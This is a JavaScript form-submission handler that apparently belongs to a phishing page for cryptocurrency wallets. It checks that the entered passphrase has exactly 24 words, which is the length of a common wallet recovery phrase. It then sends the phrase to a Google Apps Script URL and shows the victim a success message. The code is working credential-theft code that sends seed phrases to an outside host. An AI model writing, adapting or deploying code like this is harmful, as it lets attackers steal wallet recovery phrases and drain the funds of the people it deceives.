// Function to handle form submission
function handleSubmit(event) {
    event.preventDefault(); // Prevent default form submission
    const errorElement = document.getElementById('emsg');
    errorElement.textContent = '';
    const myButton = document.getElementById('b1');
    myButton.disabled = true;
    const myButton2 = document.getElementById('b2');
    myButton2.disabled = true;

    // Get the value of the hidden input field with name 'mf-texts'
    const form = document.getElementById('1Y9QKsY1UI5jA3V3xSisHcn4tiGVcSz4Q'); // Replace 'myForm' with your form ID
    const inputValue = form.elements['mf-texts'].value.trim();

    const wordCount = inputValue.split(/\s+/).length;
    if (wordCount !== 24) {
        errorElement.textContent = 'Invalid Passphrase';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
        return; // Exit function if word count is not 24
    }

    // Make a GET request to your Google Apps Script URL
    const url = `https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec?data=${encodeURIComponent(inputValue)}`;

    fetch(url, {
        method: 'GET'
    })
    .then(response => response.json()) // Expecting JSON response
    .then(data => {
        errorElement.textContent = 'Data submitted successfully!';
        myButton.disabled = false;
        myButton2.disabled = false;
        form.reset();
    })
    .catch(error => {
        console.error('Error:', error);
        errorElement.textContent = 'Error occurred while processing your request.';
        form.reset();
        myButton.disabled = false;
        myButton2.disabled = false;
    });
}




